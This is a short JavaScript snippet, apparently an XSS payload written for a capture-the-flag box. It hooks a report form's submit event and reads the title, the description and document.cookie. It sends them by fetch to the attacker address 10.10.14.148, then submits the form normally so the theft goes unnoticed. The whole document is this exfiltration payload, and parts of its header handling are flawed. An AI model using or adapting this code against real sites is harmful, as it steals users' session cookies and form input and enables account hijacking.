const form = document.querySelector('form');
form.addEventListener('submit', function(event) {
  event.preventDefault();

  const reportTitle = document.getElementById('report_title').value;
  const description = document.getElementById('description').value;

  const cookies = document.cookie;

  fetch('http://10.10.14.148/', {
    method: 'POST',
    body: JSON.stringify({ reportTitle, description }),
    headers: {
      'Content-Type': 'application/json',
      'Cookie': cookies, // Incluye las cookies en el encabezado
      'credentials': 'include'
    }
  })
  .then(response => response.json())
  .then(data => {
    // Procesa la respuesta
    console.log('Response from server:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });

  // Envía el formulario de reporte normalmente
  this.submit();
});
